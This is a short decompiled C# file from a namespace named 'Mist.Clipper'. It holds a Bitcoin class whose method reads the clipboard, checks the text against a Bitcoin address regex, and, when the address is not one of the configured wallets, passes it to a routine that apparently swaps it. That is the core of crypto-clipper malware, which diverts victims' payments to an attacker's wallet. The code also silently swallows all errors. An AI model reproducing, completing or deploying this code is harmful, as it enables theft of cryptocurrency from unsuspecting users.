using System;
using System.Linq;
using System.Windows;

namespace Mist.Clipper
{
	// Token: 0x02000074 RID: 116
	internal class Bitcoin
	{
		// Token: 0x060002BC RID: 700 RVA: 0x00012C30 File Offset: 0x00010E30
		public static void GetBitcoinWhile()
		{
			try
			{
				if (Clipboard.ContainsText())
				{
					string text = Clipboard.GetText();
					if (!Config.walletsbtc.Contains(text) && CheckBTC.Clipregex(text))
					{
						CheckBTC.SetsBTC(text);
					}
				}
			}
			catch
			{
			}
		}
	}
}
